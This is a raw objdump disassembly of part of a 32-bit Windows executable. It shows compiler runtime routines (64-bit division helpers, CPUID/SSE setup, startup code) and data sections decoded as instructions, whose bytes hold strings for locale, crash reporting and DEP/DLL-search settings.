  40ae5c:	test   eax,eax
  40ae5e:	cmove  eax,edx
  40ae61:	mov    ds:0x40c058,eax
  40ae66:	add    esp,0x1c
  40ae69:	jmp    eax
  40ae6b:	nop
  40ae6c:	lea    esi,[esi+eiz*1+0x0]
  40ae70:	mov    eax,ds:0x40c05c
  40ae75:	jmp    eax
  40ae77:	mov    esi,esi
  40ae79:	lea    edi,[edi+eiz*1+0x0]
  40ae80:	mov    eax,ds:0x40c058
  40ae85:	jmp    eax
  40ae87:	nop
  40ae88:	nop
  40ae89:	nop
  40ae8a:	nop
  40ae8b:	nop
  40ae8c:	nop
  40ae8d:	nop
  40ae8e:	nop
  40ae8f:	nop
  40ae90:	mov    eax,ds:0x410094
  40ae95:	mov    eax,DWORD PTR [eax]
  40ae97:	ret    
  40ae98:	nop
  40ae99:	lea    esi,[esi+eiz*1+0x0]
  40aea0:	sub    esp,0x1c
  40aea3:	mov    DWORD PTR [esp+0x4],0x0
  40aeab:	mov    DWORD PTR [esp],0x2
  40aeb2:	call   0x40af80
  40aeb7:	mov    DWORD PTR [esp+0x4],0x2e
  40aebf:	mov    DWORD PTR [esp],eax
  40aec2:	call   0x40af78
  40aec7:	mov    edx,eax
  40aec9:	xor    eax,eax
  40aecb:	test   edx,edx
  40aecd:	je     0x40aeda
  40aecf:	add    edx,0x1
  40aed2:	mov    DWORD PTR [esp],edx
  40aed5:	call   0x40af70
  40aeda:	add    esp,0x1c
  40aedd:	ret    
  40aede:	xchg   ax,ax
  40aee0:	push   esi
  40aee1:	push   ebx
  40aee2:	sub    esp,0x14
  40aee5:	mov    DWORD PTR [esp],0x40e23c
  40aeec:	call   DWORD PTR ds:0x4112a8
  40aef2:	sub    esp,0x4
  40aef5:	test   eax,eax
  40aef7:	mov    ebx,eax
  40aef9:	je     0x40af41
  40aefb:	mov    DWORD PTR [esp+0x4],0x40e252
  40af03:	mov    DWORD PTR [esp],eax
  40af06:	mov    esi,DWORD PTR ds:0x4112ac
  40af0c:	call   esi
  40af0e:	sub    esp,0x8
  40af11:	test   eax,eax
  40af13:	je     0x40af21
  40af15:	mov    ds:0x40c060,eax
  40af1a:	add    esp,0x14
  40af1d:	pop    ebx
  40af1e:	pop    esi
  40af1f:	jmp    eax
  40af21:	mov    DWORD PTR [esp+0x4],0x40e266
  40af29:	mov    DWORD PTR [esp],ebx
  40af2c:	call   esi
  40af2e:	mov    edx,eax
  40af30:	sub    esp,0x8
  40af33:	mov    ds:0x410094,eax
  40af38:	test   edx,edx
  40af3a:	mov    eax,0x40ae90
  40af3f:	jne    0x40af15
  40af41:	mov    eax,0x40aea0
  40af46:	mov    ds:0x40c060,eax
  40af4b:	add    esp,0x14
  40af4e:	pop    ebx
  40af4f:	pop    esi
  40af50:	jmp    eax
  40af52:	lea    esi,[esi+eiz*1+0x0]
  40af59:	lea    edi,[edi+eiz*1+0x0]
  40af60:	mov    eax,ds:0x40c060
  40af65:	jmp    eax
  40af67:	nop
  40af68:	nop
  40af69:	nop
  40af6a:	nop
  40af6b:	nop
  40af6c:	nop
  40af6d:	nop
  40af6e:	nop
  40af6f:	nop
  40af70:	jmp    DWORD PTR ds:0x4113c0
  40af76:	nop
  40af77:	nop
  40af78:	jmp    DWORD PTR ds:0x41139c
  40af7e:	nop
  40af7f:	nop
  40af80:	jmp    DWORD PTR ds:0x411394
  40af86:	nop
  40af87:	nop
  40af88:	xchg   ax,ax
  40af8a:	xchg   ax,ax
  40af8c:	xchg   ax,ax
  40af8e:	xchg   ax,ax
  40af90:	push   ebp
  40af91:	push   edi
  40af92:	push   esi
  40af93:	push   ebx
  40af94:	sub    esp,0x1c
  40af97:	mov    edx,DWORD PTR [esp+0x3c]
  40af9b:	mov    ebx,DWORD PTR [esp+0x30]
  40af9f:	mov    ecx,DWORD PTR [esp+0x34]
  40afa3:	mov    edi,DWORD PTR [esp+0x38]
  40afa7:	test   edx,edx
  40afa9:	mov    DWORD PTR [esp+0x8],ebx
  40afad:	mov    esi,ecx
  40afaf:	mov    eax,edi
  40afb1:	jne    0x40afe4
  40afb3:	cmp    edi,ecx
  40afb5:	ja     0x40b060
  40afbb:	test   edi,edi
  40afbd:	mov    ebp,edi
  40afbf:	jne    0x40afcc
  40afc1:	mov    eax,0x1
  40afc6:	xor    edx,edx
  40afc8:	div    edi
  40afca:	mov    ebp,eax
  40afcc:	mov    eax,ecx
  40afce:	xor    edx,edx
  40afd0:	div    ebp
  40afd2:	mov    ecx,eax
  40afd4:	mov    eax,ebx
  40afd6:	mov    edi,ecx
  40afd8:	div    ebp
  40afda:	add    esp,0x1c
  40afdd:	mov    edx,edi
  40afdf:	pop    ebx
  40afe0:	pop    esi
  40afe1:	pop    edi
  40afe2:	pop    ebp
  40afe3:	ret    
  40afe4:	cmp    edx,ecx
  40afe6:	ja     0x40b050
  40afe8:	bsr    edi,edx
  40afeb:	xor    edi,0x1f
  40afee:	je     0x40b072
  40aff4:	mov    ebx,0x20
  40aff9:	mov    ecx,edi
  40affb:	mov    ebp,eax
  40affd:	sub    ebx,edi
  40afff:	shl    edx,cl
  40b001:	mov    ecx,ebx
  40b003:	shr    ebp,cl
  40b005:	mov    ecx,edi
  40b007:	shl    eax,cl
  40b009:	or     ebp,edx
  40b00b:	mov    ecx,ebx
  40b00d:	mov    DWORD PTR [esp+0xc],eax
  40b011:	mov    edx,esi
  40b013:	mov    eax,DWORD PTR [esp+0x8]
  40b017:	shr    edx,cl
  40b019:	mov    ecx,edi
  40b01b:	shl    esi,cl
  40b01d:	mov    ecx,ebx
  40b01f:	shr    eax,cl
  40b021:	or     eax,esi
  40b023:	div    ebp
  40b025:	mov    esi,edx
  40b027:	mov    ebx,eax
  40b029:	mul    DWORD PTR [esp+0xc]
  40b02d:	cmp    esi,edx
  40b02f:	jb     0x40b041
  40b031:	mov    ebp,DWORD PTR [esp+0x8]
  40b035:	mov    ecx,edi
  40b037:	shl    ebp,cl
  40b039:	cmp    ebp,eax
  40b03b:	jae    0x40b090
  40b03d:	cmp    esi,edx
  40b03f:	jne    0x40b090
  40b041:	add    esp,0x1c
  40b044:	xor    edi,edi
  40b046:	lea    eax,[ebx-0x1]
  40b049:	mov    edx,edi
  40b04b:	pop    ebx
  40b04c:	pop    esi
  40b04d:	pop    edi
  40b04e:	pop    ebp
  40b04f:	ret    
  40b050:	add    esp,0x1c
  40b053:	xor    edi,edi
  40b055:	xor    eax,eax
  40b057:	pop    ebx
  40b058:	mov    edx,edi
  40b05a:	pop    esi
  40b05b:	pop    edi
  40b05c:	pop    ebp
  40b05d:	ret    
  40b05e:	xchg   ax,ax
  40b060:	add    esp,0x1c
  40b063:	mov    eax,ebx
  40b065:	mov    edx,ecx
  40b067:	div    edi
  40b069:	xor    edi,edi
  40b06b:	pop    ebx
  40b06c:	mov    edx,edi
  40b06e:	pop    esi
  40b06f:	pop    edi
  40b070:	pop    ebp
  40b071:	ret    
  40b072:	cmp    eax,DWORD PTR [esp+0x8]
  40b076:	jbe    0x40b082
  40b078:	xor    eax,eax
  40b07a:	cmp    edx,ecx
  40b07c:	jae    0x40afda
  40b082:	mov    eax,0x1
  40b087:	jmp    0x40afda
  40b08c:	lea    esi,[esi+eiz*1+0x0]
  40b090:	mov    eax,ebx
  40b092:	xor    edi,edi
  40b094:	jmp    0x40afda
  40b099:	nop
  40b09a:	nop
  40b09b:	nop
  40b09c:	nop
  40b09d:	nop
  40b09e:	nop
  40b09f:	nop
  40b0a0:	push   ebp
  40b0a1:	push   edi
  40b0a2:	push   esi
  40b0a3:	push   ebx
  40b0a4:	sub    esp,0x1c
  40b0a7:	mov    eax,DWORD PTR [esp+0x3c]
  40b0ab:	mov    ecx,DWORD PTR [esp+0x30]
  40b0af:	mov    edi,DWORD PTR [esp+0x34]
  40b0b3:	mov    esi,DWORD PTR [esp+0x38]
  40b0b7:	test   eax,eax
  40b0b9:	mov    DWORD PTR [esp+0xc],ecx
  40b0bd:	mov    edx,eax
  40b0bf:	mov    ebx,edi
  40b0c1:	mov    DWORD PTR [esp],esi
  40b0c4:	mov    DWORD PTR [esp+0x4],ecx
  40b0c8:	mov    DWORD PTR [esp+0x8],edi
  40b0cc:	jne    0x40b0e4
  40b0ce:	cmp    esi,edi
  40b0d0:	jbe    0x40b120
  40b0d2:	mov    eax,ecx
  40b0d4:	mov    edx,edi
  40b0d6:	div    esi
  40b0d8:	add    esp,0x1c
  40b0db:	mov    eax,edx
  40b0dd:	xor    edx,edx
  40b0df:	pop    ebx
  40b0e0:	pop    esi
  40b0e1:	pop    edi
  40b0e2:	pop    ebp
  40b0e3:	ret    
  40b0e4:	cmp    eax,edi
  40b0e6:	ja     0x40b140
  40b0e8:	bsr    ebp,eax
  40b0eb:	xor    ebp,0x1f
  40b0ee:	jne    0x40b150
  40b0f0:	mov    ebp,DWORD PTR [esp+0x4]
  40b0f4:	cmp    DWORD PTR [esp],ebp
  40b0f7:	jbe    0x40b1e0
  40b0fd:	cmp    eax,DWORD PTR [esp+0x8]
  40b101:	jb     0x40b1e0
  40b107:	mov    eax,DWORD PTR [esp+0x4]
  40b10b:	mov    edx,DWORD PTR [esp+0x8]
  40b10f:	add    esp,0x1c
  40b112:	pop    ebx
  40b113:	pop    esi
  40b114:	pop    edi
  40b115:	pop    ebp
  40b116:	ret    
  40b117:	mov    esi,esi
  40b119:	lea    edi,[edi+eiz*1+0x0]
  40b120:	test   esi,esi
  40b122:	mov    ebp,esi
  40b124:	jne    0x40b131
  40b126:	mov    eax,0x1
  40b12b:	xor    edx,edx
  40b12d:	div    esi
  40b12f:	mov    ebp,eax
  40b131:	mov    eax,edi
  40b133:	xor    edx,edx
  40b135:	div    ebp
  40b137:	mov    eax,ecx
  40b139:	div    ebp
  40b13b:	jmp    0x40b0d8
  40b13d:	lea    esi,[esi+0x0]
  40b140:	add    esp,0x1c
  40b143:	mov    edx,edi
  40b145:	mov    eax,ecx
  40b147:	pop    ebx
  40b148:	pop    esi
  40b149:	pop    edi
  40b14a:	pop    ebp
  40b14b:	ret    
  40b14c:	lea    esi,[esi+eiz*1+0x0]
  40b150:	mov    edi,DWORD PTR [esp]
  40b153:	mov    esi,0x20
  40b158:	mov    ecx,ebp
  40b15a:	sub    esi,ebp
  40b15c:	shl    edx,cl
  40b15e:	mov    ecx,esi
  40b160:	mov    eax,edi
  40b162:	shr    eax,cl
  40b164:	mov    ecx,ebp
  40b166:	or     eax,edx
  40b168:	mov    edx,DWORD PTR [esp+0xc]
  40b16c:	mov    DWORD PTR [esp],eax
  40b16f:	mov    eax,edi
  40b171:	mov    edi,ebx
  40b173:	shl    eax,cl
  40b175:	mov    ecx,esi
  40b177:	shr    edi,cl
  40b179:	mov    ecx,ebp
  40b17b:	mov    DWORD PTR [esp+0x4],eax
  40b17f:	shl    ebx,cl
  40b181:	mov    ecx,esi
  40b183:	shr    edx,cl
  40b185:	mov    ecx,ebp
  40b187:	mov    eax,edx
  40b189:	mov    edx,DWORD PTR [esp+0xc]
  40b18d:	or     eax,ebx
  40b18f:	shl    edx,cl
  40b191:	mov    DWORD PTR [esp+0x8],edx
  40b195:	mov    edx,edi
  40b197:	div    DWORD PTR [esp]
  40b19a:	mov    ecx,edx
  40b19c:	mul    DWORD PTR [esp+0x4]
  40b1a0:	cmp    ecx,edx
  40b1a2:	mov    ebx,eax
  40b1a4:	mov    edi,edx
  40b1a6:	jb     0x40b1b2
  40b1a8:	cmp    DWORD PTR [esp+0x8],eax
  40b1ac:	jae    0x40b1bd
  40b1ae:	cmp    ecx,edx
  40b1b0:	jne    0x40b1bd
  40b1b2:	mov    edi,edx
  40b1b4:	mov    ebx,eax
  40b1b6:	sub    ebx,DWORD PTR [esp+0x4]
  40b1ba:	sbb    edi,DWORD PTR [esp]
  40b1bd:	mov    edx,ecx
  40b1bf:	mov    ecx,ebp
  40b1c1:	mov    eax,DWORD PTR [esp+0x8]
  40b1c5:	sub    eax,ebx
  40b1c7:	sbb    edx,edi
  40b1c9:	shr    eax,cl
  40b1cb:	mov    ebx,edx
  40b1cd:	mov    ecx,esi
  40b1cf:	add    esp,0x1c
  40b1d2:	shl    ebx,cl
  40b1d4:	mov    ecx,ebp
  40b1d6:	or     eax,ebx
  40b1d8:	shr    edx,cl
  40b1da:	pop    ebx
  40b1db:	pop    esi
  40b1dc:	pop    edi
  40b1dd:	pop    ebp
  40b1de:	ret    
  40b1df:	nop
  40b1e0:	mov    ebx,ecx
  40b1e2:	sub    ebx,esi
  40b1e4:	sbb    edi,eax
  40b1e6:	mov    DWORD PTR [esp+0x4],ebx
  40b1ea:	mov    DWORD PTR [esp+0x8],edi
  40b1ee:	jmp    0x40b107
  40b1f3:	nop
  40b1f4:	nop
  40b1f5:	nop
  40b1f6:	nop
  40b1f7:	nop
  40b1f8:	nop
  40b1f9:	nop
  40b1fa:	nop
  40b1fb:	nop
  40b1fc:	nop
  40b1fd:	nop
  40b1fe:	nop
  40b1ff:	nop
  40b200:	lea    ecx,[esp+0x4]
  40b204:	and    esp,0xfffffff0
  40b207:	push   DWORD PTR [ecx-0x4]
  40b20a:	push   ebp
  40b20b:	mov    ebp,esp
  40b20d:	push   ecx
  40b20e:	sub    esp,0x14
  40b211:	call   0x4029b0
  40b216:	mov    eax,ds:0x40c000
  40b21b:	mov    DWORD PTR [esp+0x4],0x0
  40b223:	mov    DWORD PTR [esp+0xc],eax
  40b227:	mov    eax,ds:0x410098
  40b22c:	mov    DWORD PTR [esp+0x8],eax
  40b230:	mov    eax,ds:0x41009c
  40b235:	mov    DWORD PTR [esp],eax
  40b238:	call   0x401ae0
  40b23d:	mov    ecx,DWORD PTR [ebp-0x4]
  40b240:	sub    esp,0x10
  40b243:	leave  
  40b244:	lea    esp,[ecx-0x4]
  40b247:	ret    
  40b248:	nop
  40b249:	nop
  40b24a:	nop
  40b24b:	nop
  40b24c:	nop
  40b24d:	nop
  40b24e:	nop
  40b24f:	nop
  40b250:	pushf  
  40b251:	pushf  
  40b252:	pop    eax
  40b253:	mov    edx,eax
  40b255:	xor    eax,0x200000
  40b25a:	push   eax
  40b25b:	popf   
  40b25c:	pushf  
  40b25d:	pop    eax
  40b25e:	popf   
  40b25f:	xor    eax,edx
  40b261:	test   eax,0x200000
  40b266:	je     0x40b2ad
  40b268:	push   ebp
  40b269:	xor    eax,eax
  40b26b:	mov    ebp,esp
  40b26d:	push   ebx
  40b26e:	cpuid  
  40b270:	and    esp,0xfffffff0
  40b273:	sub    esp,0x210
  40b279:	test   eax,eax
  40b27b:	je     0x40b2a9
  40b27d:	mov    eax,0x1
  40b282:	cpuid  
  40b284:	test   edx,0x2000000
  40b28a:	je     0x40b2a9
  40b28c:	and    edx,0x1000000
  40b292:	jne    0x40b2ae
  40b294:	stmxcsr DWORD PTR [esp+0xc]
  40b299:	mov    eax,DWORD PTR [esp+0xc]
  40b29d:	or     ah,0x80
  40b2a0:	mov    DWORD PTR [esp+0xc],eax
  40b2a4:	ldmxcsr DWORD PTR [esp+0xc]
  40b2a9:	mov    ebx,DWORD PTR [ebp-0x4]
  40b2ac:	leave  
  40b2ad:	ret    
  40b2ae:	mov    DWORD PTR [esp+0x2c],0x0
  40b2b6:	fxsave [esp+0x10]
  40b2bb:	mov    eax,DWORD PTR [esp+0x28]
  40b2bf:	mov    edx,eax
  40b2c1:	or     edx,0x40
  40b2c4:	test   BYTE PTR [esp+0x2c],0x40
  40b2c9:	cmovne eax,edx
  40b2cc:	jmp    0x40b29d
  40b2ce:	nop
  40b2cf:	nop
  40b2d0:	push   ebp
  40b2d1:	mov    ebp,esp
  40b2d3:	sub    esp,0x18
  40b2d6:	call   0x401500
  40b2db:	mov    DWORD PTR [esp],0x401550
  40b2e2:	call   0x402910
  40b2e7:	leave  
  40b2e8:	ret    
  40b2e9:	nop
  40b2ea:	nop
  40b2eb:	nop
  40b2ec:	nop
  40b2ed:	nop
  40b2ee:	nop
  40b2ef:	nop
  40b2f0:	(bad)  
  40b2f1:	(bad)  
  40b2f2:	(bad)  
  40b2f3:	call   DWORD PTR [eax-0x4e]
  40b2f6:	inc    eax
  40b2f7:	add    al,dl
  40b2f9:	mov    dl,0x40
  40b2fb:	add    BYTE PTR [eax],al
  40b2fd:	add    BYTE PTR [eax],al
  40b2ff:	add    bh,bh
  40b301:	(bad)  
  40b302:	(bad)  
  40b303:	inc    DWORD PTR [eax]
  40b305:	add    BYTE PTR [eax],al
	...

Disassembly of section .data:

0040c000 <.data>:
  40c000:	or     al,BYTE PTR [eax]
  40c002:	add    BYTE PTR [eax],al
  40c004:	add    al,0xb3
  40c006:	inc    eax
  40c007:	add    bh,bh
  40c009:	(bad)  
  40c00a:	(bad)  
  40c00b:	(bad)  
  40c00c:	(bad)  
  40c00d:	(bad)  
  40c00e:	(bad)  
  40c00f:	(bad)  
  40c010:	inc    DWORD PTR [eax]
  40c012:	add    BYTE PTR [eax],al
  40c014:	add    al,BYTE PTR [eax]
  40c016:	add    BYTE PTR [eax],al
  40c018:	(bad)  
  40c019:	(bad)  
  40c01a:	(bad)  
  40c01b:	inc    DWORD PTR [eax+0x0]
  40c01e:	add    BYTE PTR [eax],al
  40c020:	ret    
  40c021:	mov    edi,0x3fc0ffff
  40c026:	add    BYTE PTR [eax],al
  40c028:	add    DWORD PTR [eax],eax
  40c02a:	add    BYTE PTR [eax],al
  40c02c:	add    BYTE PTR [eax],al
  40c02e:	add    BYTE PTR [eax],al
  40c030:	push   cs
  40c031:	add    BYTE PTR [eax],al
  40c033:	add    BYTE PTR [eax+0x0],al
  40c036:	add    BYTE PTR [eax],al
  40c038:	ret    
  40c039:	mov    edi,0x3fc0ffff
  40c03e:	add    BYTE PTR [eax],al
  40c040:	add    DWORD PTR [eax],eax
  40c042:	add    BYTE PTR [eax],al
  40c044:	add    BYTE PTR [eax],al
  40c046:	add    BYTE PTR [eax],al
  40c048:	push   cs
  40c049:	add    BYTE PTR [eax],al
  40c04b:	add    BYTE PTR [eax],al
  40c04d:	test   DWORD PTR [eax+0x0],0x40ada0
  40c054:	mov    al,0xad
  40c056:	inc    eax
  40c057:	add    BYTE PTR [eax],dh
  40c059:	scas   al,BYTE PTR es:[edi]
  40c05a:	inc    eax
  40c05b:	add    al,ah
  40c05d:	lods   eax,DWORD PTR ds:[esi]
  40c05e:	inc    eax
  40c05f:	add    al,ah
  40c061:	scas   al,BYTE PTR es:[edi]
  40c062:	inc    eax
  40c063:	add    BYTE PTR [esi-0x1a],cl
  40c066:	inc    eax
  40c067:	mov    ebx,0x44bf19b1
  40c06c:	add    BYTE PTR [eax],al
	...

Disassembly of section .rdata:

0040d000 <.rdata>:
  40d000:	ins    BYTE PTR es:[edi],dx
  40d001:	imul   esp,DWORD PTR [edx+0x67],0x312d6a63
  40d008:	xor    ebp,DWORD PTR [esi]
  40d00a:	fs ins BYTE PTR es:[edi],dx
  40d00c:	ins    BYTE PTR es:[edi],dx
  40d00d:	add    BYTE PTR [edi+0x4a],bl
  40d010:	jbe    0x40d071
  40d012:	push   edx
  40d013:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  40d01c:	popa   
  40d01d:	jae    0x40d092
  40d01f:	gs jae 0x40d022
  40d022:	add    BYTE PTR [eax],al
  40d024:	dec    esp
  40d025:	inc    ecx
  40d026:	dec    esi
  40d027:	inc    edi
  40d028:	cmp    eax,0x25007325
  40d02d:	add    BYTE PTR [eax+0x0],dh
  40d030:	jl     0x40d032
  40d032:	and    eax,0x73006c00
  40d037:	add    BYTE PTR [edx],cl
  40d039:	add    BYTE PTR [eax],al
  40d03b:	add    BYTE PTR [eax],ah
  40d03d:	add    BYTE PTR [eax+eax*1+0x20],bh
  40d041:	add    BYTE PTR ds:0x7000,ah
  40d047:	add    BYTE PTR [ebp+0x6e],dh
  40d04a:	push   0x6c646e61
  40d04f:	gs and BYTE PTR fs:[esi+0x6c],dh
  40d054:	arpl   WORD PTR [eax],sp
  40d056:	gs js  0x40d0bc
  40d059:	gs jo  0x40d0d0
  40d05c:	imul   ebp,DWORD PTR [edi+0x6e],0x7700000a
  40d063:	add    BYTE PTR [eax+eax*1],ch
  40d066:	and    BYTE PTR [eax],al
  40d068:	arpl   WORD PTR [eax],ax
  40d06a:	arpl   WORD PTR [eax],ax
  40d06c:	jae    0x40d06e
  40d06e:	cmp    eax,0x54005500
  40d073:	add    BYTE PTR [esi+0x0],al
  40d076:	sub    eax,0x3800
  40d07b:	add    BYTE PTR [edx],cl
  40d07d:	gs jb  0x40d0f2
  40d080:	outs   dx,DWORD PTR ds:[esi]
  40d081:	jb     0x40d0a3
  40d083:	ja     0x40d0ed
  40d085:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x6e65706f
  40d08d:	imul   ebp,DWORD PTR [esi+0x67],0x6c696620
  40d094:	add    BYTE PTR gs:[eax],al
  40d097:	add    BYTE PTR [ebx+0x0],bl
  40d09a:	jbe    0x40d09c
  40d09c:	add    BYTE PTR gs:[edx+0x0],dh
  40d0a0:	jae    0x40d0a2
  40d0a2:	imul   eax,DWORD PTR [eax],0x6e006f
  40d0a8:	pop    ebp
  40d0a9:	add    BYTE PTR [edx],cl
  40d0ab:	add    BYTE PTR [edi+0x0],cl
  40d0ae:	push   ebx
  40d0af:	add    BYTE PTR ds:0x64002500,bh
  40d0b5:	add    BYTE PTR [esi],ch
  40d0b7:	add    BYTE PTR ds:0x2e006400,ah
  40d0bd:	add    BYTE PTR ds:0x2e006400,ah
  40d0c3:	add    BYTE PTR ds:0x2e006400,ah
  40d0c9:	add    BYTE PTR ds:0x73006c00,ah
  40d0cf:	add    BYTE PTR [edx],cl
  40d0d1:	add    BYTE PTR [esi+0x0],dl
  40d0d4:	dec    esp
  40d0d5:	add    BYTE PTR [ebx+0x0],al
  40d0d8:	cmp    eax,0x2e003200
  40d0dd:	add    BYTE PTR [edx],dh
  40d0df:	add    BYTE PTR [esi],ch
  40d0e1:	add    BYTE PTR [esi],dh
  40d0e3:	add    BYTE PTR [eax],ah
  40d0e5:	add    BYTE PTR [ebp+0x0],dl
  40d0e8:	ins    DWORD PTR es:[edi],dx
  40d0e9:	add    BYTE PTR [edx+0x0],ah
  40d0ec:	jb     0x40d0ee
  40d0ee:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  40d0f3:	add    BYTE PTR [ecx+0x0],ah
  40d0f6:	add    BYTE PTR [eax],al
  40d0f8:	or     al,BYTE PTR [eax]
  40d0fa:	or     al,BYTE PTR [eax]
  40d0fc:	pop    ebx
  40d0fd:	add    BYTE PTR [ebp+0x0],ah
  40d100:	js     0x40d102
  40d102:	arpl   WORD PTR [eax],ax
  40d104:	add    BYTE PTR gs:[eax+0x0],dh
  40d108:	je     0x40d10a
  40d10a:	imul   eax,DWORD PTR [eax],0x6e006f
  40d110:	jae    0x40d112
  40d112:	pop    ebp
  40d113:	add    BYTE PTR [edx],cl
  40d115:	add    BYTE PTR ds:0x38003000,ah
  40d11b:	add    BYTE PTR [eax+0x0],bh
  40d11e:	and    BYTE PTR [eax],al
  40d120:	popa   
  40d121:	add    BYTE PTR [eax+eax*1+0x20],dh
  40d125:	add    BYTE PTR ds:0x78007000,ah
  40d12b:	add    BYTE PTR [eax],al
  40d12d:	add    BYTE PTR [eax],al
  40d12f:	add    BYTE PTR [edx],cl
  40d131:	add    BYTE PTR [edx],cl
  40d133:	add    BYTE PTR [ebx+0x0],bl
  40d136:	arpl   WORD PTR [eax],ax
  40d138:	outs   dx,DWORD PTR ds:[esi]
  40d139:	add    BYTE PTR [esi+0x0],ch
  40d13c:	je     0x40d13e
  40d13e:	add    BYTE PTR gs:[eax+0x0],bh
  40d142:	je     0x40d144
  40d144:	pop    ebp
  40d145:	add    BYTE PTR [edx],cl
  40d147:	add    BYTE PTR [ebp+0x0],al
  40d14a:	inc    esp
  40d14b:	add    BYTE PTR [ecx+0x0],cl
  40d14e:	cmp    al,BYTE PTR [eax]
  40d150:	and    eax,0x78007000
  40d155:	add    BYTE PTR [edx],cl
  40d157:	add    BYTE PTR [ebp+0x0],al
  40d15a:	push   ebx
  40d15b:	add    BYTE PTR [ecx+0x0],cl
  40d15e:	cmp    al,BYTE PTR [eax]
  40d160:	and    eax,0x78007000
  40d165:	add    BYTE PTR [edx],cl
  40d167:	add    BYTE PTR [ebp+0x0],al
  40d16a:	inc    edx
  40d16b:	add    BYTE PTR [eax+0x0],bl
  40d16e:	cmp    al,BYTE PTR [eax]
  40d170:	and    eax,0x78007000
  40d175:	add    BYTE PTR [edx],cl
  40d177:	add    BYTE PTR [ebp+0x0],al
  40d17a:	inc    esp
  40d17b:	add    BYTE PTR [eax+0x0],bl
  40d17e:	cmp    al,BYTE PTR [eax]
  40d180:	and    eax,0x78007000
  40d185:	add    BYTE PTR [edx],cl
  40d187:	add    BYTE PTR [ebp+0x0],al
  40d18a:	inc    ebx
  40d18b:	add    BYTE PTR [eax+0x0],bl
  40d18e:	cmp    al,BYTE PTR [eax]
  40d190:	and    eax,0x78007000
  40d195:	add    BYTE PTR [edx],cl
  40d197:	add    BYTE PTR [ebp+0x0],al
  40d19a:	inc    ecx
  40d19b:	add    BYTE PTR [eax+0x0],bl
  40d19e:	cmp    al,BYTE PTR [eax]
  40d1a0:	and    eax,0x78007000
  40d1a5:	add    BYTE PTR [edx],cl
  40d1a7:	add    BYTE PTR [ebp+0x0],al
  40d1aa:	inc    edx
  40d1ab:	add    BYTE PTR [eax+0x0],dl
  40d1ae:	cmp    al,BYTE PTR [eax]
  40d1b0:	and    eax,0x78007000
  40d1b5:	add    BYTE PTR [edx],cl
  40d1b7:	add    BYTE PTR [ebp+0x0],al
  40d1ba:	dec    ecx
  40d1bb:	add    BYTE PTR [eax+0x0],dl
  40d1be:	cmp    al,BYTE PTR [eax]
  40d1c0:	and    eax,0x78007000
  40d1c5:	add    BYTE PTR [edx],cl
  40d1c7:	add    BYTE PTR [ebp+0x0],al
  40d1ca:	push   ebx
  40d1cb:	add    BYTE PTR [eax+0x0],dl
  40d1ce:	cmp    al,BYTE PTR [eax]
  40d1d0:	and    eax,0x78007000
  40d1d5:	add    BYTE PTR [edx],cl
  40d1d7:	add    BYTE PTR [eax],al
  40d1d9:	add    BYTE PTR [eax],al
  40d1db:	add    BYTE PTR [edx],cl
  40d1dd:	add    BYTE PTR [ebx+0x0],bl
  40d1e0:	jae    0x40d1e2
  40d1e2:	je     0x40d1e4
  40d1e4:	popa   
  40d1e5:	add    BYTE PTR [ebx+0x0],ah
  40d1e8:	imul   eax,DWORD PTR [eax],0x74
  40d1eb:	add    BYTE PTR [edx+0x0],dh
  40d1ee:	popa   
  40d1ef:	add    BYTE PTR [ebx+0x0],ah
  40d1f2:	add    BYTE PTR gs:[ebp+0x0],bl
  40d1f6:	or     al,BYTE PTR [eax]
  40d1f8:	and    eax,DWORD PTR [eax]
  40d1fa:	inc    ebp
  40d1fb:	add    BYTE PTR [ecx+0x0],cl
  40d1fe:	push   eax
  40d1ff:	add    BYTE PTR [eax+eax*1+0x62],bh
  40d203:	add    BYTE PTR [ecx+0x0],ah
  40d206:	jae    0x40d208
  40d208:	add    BYTE PTR gs:[eax+eax*1+0x6d],bh
  40d20d:	add    BYTE PTR [edi+0x0],ch
  40d210:	add    BYTE PTR fs:[ebp+0x0],dh
  40d214:	ins    BYTE PTR es:[edi],dx
  40d215:	add    BYTE PTR [ebp+0x0],ah
  40d218:	or     al,BYTE PTR [eax]
  40d21a:	add    BYTE PTR [eax],al
  40d21c:	or     al,BYTE PTR [eax]
  40d21e:	or     al,BYTE PTR [eax]
  40d220:	pop    ebx
  40d221:	add    BYTE PTR [ebp+0x0],ch
  40d224:	outs   dx,DWORD PTR ds:[esi]
  40d225:	add    BYTE PTR [eax+eax*1+0x75],ah
  40d229:	add    BYTE PTR [eax+eax*1+0x65],ch
  40d22d:	add    BYTE PTR [ebx+0x0],dh
  40d230:	pop    ebp
  40d231:	add    BYTE PTR [edx],cl
  40d233:	add    BYTE PTR [eax],al
  40d235:	add    BYTE PTR [edi+0x45],al
  40d238:	push   esp
  40d239:	push   esp
  40d23a:	inc    ebp
  40d23b:	pop    eax
  40d23c:	push   esp
  40d23d:	pop    edi
  40d23e:	dec    ebp
  40d23f:	push   ebp
  40d240:	dec    ecx
  40d241:	cmp    eax,0x6b0031
  40d246:	add    BYTE PTR gs:[edx+0x0],dh
  40d24a:	outs   dx,BYTE PTR ds:[esi]
  40d24b:	add    BYTE PTR [ebp+0x0],ah
  40d24e:	ins    BYTE PTR es:[edi],dx
  40d24f:	add    BYTE PTR [ebx],dh
  40d251:	add    BYTE PTR [edx],dh
  40d253:	add    BYTE PTR [esi],ch
  40d255:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40d259:	add    BYTE PTR [eax+eax*1+0x0],ch
  40d25d:	add    BYTE PTR [ebx+0x65],dl
  40d260:	je     0x40d2b2
  40d262:	jb     0x40d2d3
  40d264:	arpl   WORD PTR [ebp+0x73],sp
  40d267:	jae    0x40d2ad
  40d269:	inc    ebp
  40d26a:	push   eax
  40d26b:	push   eax
  40d26c:	outs   dx,DWORD PTR ds:[esi]
  40d26d:	ins    BYTE PTR es:[edi],dx
  40d26e:	imul   esp,DWORD PTR [ebx+0x79],0x74655300
  40d275:	inc    esp
  40d276:	ins    BYTE PTR es:[edi],dx
  40d277:	ins    BYTE PTR es:[edi],dx
  40d278:	inc    esp
  40d279:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40d280:	jns    0x40d2c3
  40d282:	add    BYTE PTR [eax],al
  40d284:	push   ebx
  40d285:	gs je  0x40d2cc
  40d288:	gs popaw 
  40d28b:	jne    0x40d2f9
  40d28d:	je     0x40d2d3
  40d28f:	ins    BYTE PTR es:[edi],dx
  40d290:	ins    BYTE PTR es:[edi],dx
